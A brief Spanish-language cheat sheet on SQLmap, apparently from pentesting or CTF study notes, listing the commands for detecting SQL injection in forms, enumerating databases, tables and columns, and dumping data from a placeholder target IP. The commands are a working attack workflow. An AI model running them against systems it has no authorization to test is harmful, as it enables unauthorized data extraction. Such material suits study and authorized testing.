# Inyecciones SQL con SQLmap

SQLmap automatiza la deteccion y explotacion de inyecciones SQL.

## Enumerar Bases de Datos

```bash
sqlmap -u http://<IP_objetivo> --forms --dbs --batch
```

- `--forms` -> Detecta formularios en la pagina
- `--dbs` -> Lista las bases de datos disponibles
- `--batch` -> Modo no interactivo (valores por defecto)

## Enumerar Tablas de una Base de Datos

```bash
sqlmap -u http://<IP_objetivo> --forms -D <base_datos> --tables --batch
```

## Enumerar Columnas de una Tabla

```bash
sqlmap -u http://<IP_objetivo> --forms -D <base_datos> -T <tabla> --columns --batch
```

## Extraer Datos

```bash
sqlmap -u http://<IP_objetivo> --forms -D <base_datos> -T <tabla> -C <columna1,columna2> --dump --batch
```

## Flujo Tipico
1. `--dbs` -> Descubrir bases de datos
2. `-D <db> --tables` -> Descubrir tablas
3. `-D <db> -T <tabla> --columns` -> Descubrir columnas
4. `-D <db> -T <tabla> -C <cols> --dump` -> Extraer datos
